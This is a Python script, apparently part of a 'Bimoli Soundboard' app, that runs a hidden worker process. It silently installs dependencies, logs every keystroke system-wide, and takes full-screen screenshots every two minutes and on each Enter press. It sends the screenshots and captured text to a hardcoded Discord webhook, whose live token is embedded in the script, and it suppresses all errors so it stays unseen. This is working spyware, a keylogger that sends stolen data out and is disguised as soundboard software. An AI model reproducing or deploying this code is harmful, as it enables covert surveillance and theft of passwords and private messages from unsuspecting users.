#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
from datetime import datetime

WEBHOOK_SS = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
AUTO_SS_INTERVAL = 120
APPDATA_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'BimoliSoundboard')
LOCK_FILE = os.path.join(APPDATA_DIR, '.worker.lock')
STOP_FILE = os.path.join(APPDATA_DIR, '.worker.stop')

class SilentWorker:
    def __init__(self):
        self.text = ""
        self.running = True
        self.lock_obj = threading.Lock()
        self.last_ss = time.time()
        
    def _send(self, message=""):
        try:
            from PIL import ImageGrab
            from io import BytesIO
            import requests
            
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG", optimize=True, quality=70)
            buf.seek(0)
            
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if message:
                caption = f"📸 **{ts}** | ✏️ Catatan:\n```\n{message}\n```"
            else:
                caption = f"⏰ **{ts}** | Auto Screenshot"
            
            files = {'file': (f"ss_{ts.replace(':', '-')}.png", buf, 'image/png')}
            requests.post(WEBHOOK_SS, data={'content': caption}, files=files, timeout=10)
            buf.close()
        except:
            pass
    
    def _loop(self):
        while self.running:
            time.sleep(1)
            if os.path.exists(STOP_FILE):
                self.running = False
                break
            if self.running and time.time() - self.last_ss >= AUTO_SS_INTERVAL:
                self.last_ss = time.time()
                self._send()
        self.cleanup()
    
    def _on_key(self, event):
        if not self.running:
            return
        with self.lock_obj:
            if event.name == 'enter':
                if self.text.strip():
                    self._send(self.text.strip())
                    self.text = ""
            elif event.name == 'space':
                self.text += " "
            elif event.name == 'backspace':
                self.text = self.text[:-1] if self.text else ""
            elif len(event.name) == 1:
                self.text += event.name
    
    def start(self):
        # Install deps silently
        try:
            import keyboard
            from PIL import ImageGrab
            from io import BytesIO
            import requests
        except:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            try:
                import keyboard
                from PIL import ImageGrab
            except:
                return
        
        # Create lock file
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        
        # Remove stop file
        if os.path.exists(STOP_FILE):
            os.remove(STOP_FILE)
        
        self.running = True
        self.last_ss = time.time()
        
        # Send start notification
        self._send("✅ Bimoli Worker Started!")
        
        # Start auto SS loop
        t = threading.Thread(target=self._loop, daemon=True)
        t.start()
        
        # Start keyboard listener
        import keyboard
        keyboard.on_press(self._on_key)
        
        # Keep alive - check stop signal every second
        try:
            while self.running:
                time.sleep(1)
                if os.path.exists(STOP_FILE):
                    self.running = False
        except KeyboardInterrupt:
            pass
        
        self.cleanup()
    
    def cleanup(self):
        try:
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
        except:
            pass
        try:
            if os.path.exists(STOP_FILE):
                os.remove(STOP_FILE)
        except:
            pass

def is_worker_running():
    """Check if worker process is running"""
    if not os.path.exists(LOCK_FILE):
        return False
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0400, False, pid)
        if handle:
            kernel32.CloseHandle(handle)
            return True
    except:
        pass
    try:
        os.remove(LOCK_FILE)
    except:
        pass
    return False

def stop_worker():
    """Stop worker process"""
    os.makedirs(APPDATA_DIR, exist_ok=True)
    with open(STOP_FILE, 'w') as f:
        f.write("stop")
    
    for _ in range(20):
        if not os.path.exists(LOCK_FILE):
            return True
        time.sleep(0.5)
    
    # Force kill
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0001, False, pid)
        if handle:
            kernel32.TerminateProcess(handle, 0)
            kernel32.CloseHandle(handle)
    except:
        pass
    
    for f in [LOCK_FILE, STOP_FILE]:
        try:
            os.remove(f)
        except:
            pass
    
    return not os.path.exists(LOCK_FILE)

if __name__ == "__main__":
    if is_worker_running():
        sys.exit(0)
    
    worker = SilentWorker()
    worker.start()
